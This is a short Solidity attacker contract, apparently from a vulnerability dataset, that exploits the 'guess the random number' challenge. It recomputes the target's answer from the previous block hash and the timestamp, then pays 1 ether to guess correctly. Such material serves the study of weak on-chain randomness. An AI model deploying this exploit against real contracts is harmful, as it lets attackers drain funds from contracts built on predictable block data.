pragma solidity ^0.4.21;

import "../dataset/bad_randomness/guess_the_random_number.sol";

contract GuessTheRandomNumberChallengeAttacker {
    GuessTheRandomNumberChallenge target;

    function GuessTheRandomNumberChallengeAttacker(
        address _target
    ) public payable {
        target = GuessTheRandomNumberChallenge(_target);
    }

    function attack(
        uint256 block_number,
        uint256 block_timestamp
    ) public payable {
        uint8 answer = uint8(
            keccak256(block.blockhash(block_number - 1), block_timestamp)
        );
        target.guess.value(1 ether)(answer);
    }

    function() public payable {}
}
